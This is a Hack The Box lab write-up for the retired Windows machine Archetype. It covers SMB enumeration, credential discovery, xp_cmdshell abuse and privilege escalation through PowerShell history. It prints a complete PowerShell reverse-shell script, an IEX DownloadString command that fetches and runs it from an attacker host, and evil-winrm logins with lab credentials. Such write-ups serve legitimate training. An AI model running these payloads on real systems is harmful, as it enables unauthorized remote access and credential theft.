# HTB Starting Point — Archetype

**Author:** FedeTheHacker95  
**Platform:** Hack The Box — Starting Point Tier 2  
**Difficulty:** Very Easy  
**OS:** Windows  
**Status:** Retired  
**Date:** 06 April 2026

---

## Summary

Archetype is a Windows machine that simulates a real-world scenario involving misconfigured SMB shares and a Microsoft SQL Server instance. The attack chain starts with anonymous SMB enumeration, leads to credential discovery in a configuration file, pivots through MSSQL's `xp_cmdshell` to achieve RCE, and concludes with privilege escalation via PowerShell command history containing plaintext administrator credentials.

---

## Enumeration

### Nmap

```bash
sudo nmap -sS -sV -sC 10.129.95.187
```

**Key findings:**

|Port|Service|Version|
|---|---|---|
|135|msrpc|Microsoft Windows RPC|
|139|netbios-ssn|Windows netbios-ssn|
|445|microsoft-ds|Windows Server 2019 Standard|
|1433|ms-sql-s|Microsoft SQL Server 2017 RTM|
|5985|http|Microsoft HTTPAPI 2.0 (WinRM)|

Notable nmap script output:

- `account_used: guest` — SMB allows unauthenticated/guest connections
- `message signing: disabled` — SMB signing not enforced (potential relay attack surface)
- SQL Server instance: `ARCHETYPE\sql_svc`, version `14.00.1000.00`

Full port scan confirmed no additional attack surface beyond the above.

---

## Foothold

### SMB Enumeration

Guest authentication was allowed, so share enumeration was attempted without credentials:

```bash
smbclient -L 10.129.95.187 -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

The `backups` share is non-default and immediately interesting. Connected anonymously:

```bash
smbclient //10.129.95.187/backups -N
```

Inside the share, a DTSX configuration file was found:

```
smb: \> ls
  prod.dtsConfig
```

The file contained a SQL Server connection string with plaintext credentials:

```xml
<ConfiguredValue>
  Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
  Initial Catalog=Catalog;Provider=SQLNCLI10.1;
  Persist Security Info=True;Auto Translate=False;
</ConfiguredValue>
```

**Credentials found:** `ARCHETYPE\sql_svc` / `M3g4c0rp123`

---

### MSSQL Access

Connected to the SQL Server instance using Impacket's `mssqlclient`:

```bash
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth
```

Connection was successful. Verified running context:

```sql
EXEC xp_cmdshell 'whoami'
-- Output: archetype\sql_svc
```

`xp_cmdshell` required enabling first:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

With OS command execution available, the next step was to obtain a proper interactive shell.

---

### Reverse Shell via PowerShell

A PowerShell reverse shell payload was created on the attack machine (`shell.ps1`):

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.50",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

Setup on the attack machine:

```bash
# Terminal 1 — serve the payload
python3 -m http.server 80

# Terminal 2 — listener
nc -lvnp 4444
```

Triggered via `xp_cmdshell`:

```sql
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.50/shell.ps1\")"'
```

Reverse shell received:

```
connect to [10.10.14.50] from (UNKNOWN) [10.129.95.187] 49676
PS C:\Windows\system32>
```

---

## User Flag

```powershell
type C:\Users\sql_svc\Desktop\user.txt
```

```
3e7b102e78218e935bf3f4951fec21a3
```

---

## Privilege Escalation

### WinPEAS

WinPEAS was transferred and executed for automated enumeration:

```powershell
# On attack machine
# (winPEASx64.exe already in the http server directory)

# On victim
iwr http://10.10.14.50/winPEASx64.exe -OutFile C:\Users\sql_svc\Desktop\winpeas.exe
.\winpeas.exe
```

### PowerShell History

WinPEAS flagged the PowerShell history file as a point of interest. Examined manually:

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

**Administrator credentials found:** `administrator` / `MEGACORP_4dm1n!!`

### WinRM Access as Administrator

Port 5985 (WinRM) was open from the initial Nmap scan. Used `evil-winrm` to authenticate as Administrator:

```bash
evil-winrm -i 10.129.95.187 -u administrator -p 'MEGACORP_4dm1n!!'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

---

## Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

```
b91ccec3305e98240082d4474b6c5f73
```

---

## Attack Chain Summary

```
Anonymous SMB (guest)
        ↓
backups share → prod.dtsConfig → sql_svc credentials
        ↓
MSSQL (impacket-mssqlclient) → xp_cmdshell enabled
        ↓
PowerShell reverse shell via IEX + HTTP
        ↓
User flag (sql_svc)
        ↓
WinPEAS → PSReadLine history → Administrator plaintext password
        ↓
evil-winrm as Administrator
        ↓
Root flag
```

---

## Key Takeaways

- **Sensitive files in SMB shares** — DTSX configuration files can contain plaintext credentials. Non-default shares should always be enumerated.
- **xp_cmdshell as an attack primitive** — MSSQL's `xp_cmdshell` provides direct OS command execution when the service account has sufficient privileges.
- **PowerShell history as a credential store** — `ConsoleHost_history.txt` is frequently overlooked and can contain commands with plaintext credentials typed by administrators.
- **WinRM as a lateral movement vector** — Port 5985 open + valid credentials = immediate shell as that user without needing to drop any payload.

---

## Tools Used

| Tool                 | Purpose                                      |
| -------------------- | -------------------------------------------- |
| nmap                 | Port scanning and service enumeration        |
| smbclient            | SMB share enumeration and file retrieval     |
| impacket-mssqlclient | MSSQL authentication and `xp_cmdshell` abuse |
| python3 http.server  | Payload delivery                             |
| netcat               | Reverse shell listener                       |
| WinPEAS              | Windows privilege escalation enumeration     |
| evil-winrm           | WinRM shell as Administrator                 |